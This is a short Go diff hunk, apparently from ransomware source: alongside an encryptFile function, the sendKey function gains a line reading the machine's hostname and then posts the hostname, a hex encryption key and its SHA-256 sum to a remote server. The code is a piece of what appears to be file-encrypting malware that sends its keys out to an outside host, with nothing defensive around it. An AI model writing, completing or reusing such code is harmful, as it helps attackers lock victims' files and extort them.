@@ -150,7 +150,7 @@ func encryptFile(path string) {
 }
 
 func sendKey(hexKey string) (string, error) {
-
+	hostname, _ := os.Hostname()
 	sum := sha256.Sum256([]byte(hexKey))
 	shaSum := fmt.Sprintf("%x", sum)
 	resp, err := http.PostForm("https://", url.Values{"hostname": {hostname}, "key": {hexKey}, "sha256sum": {shaSum}})
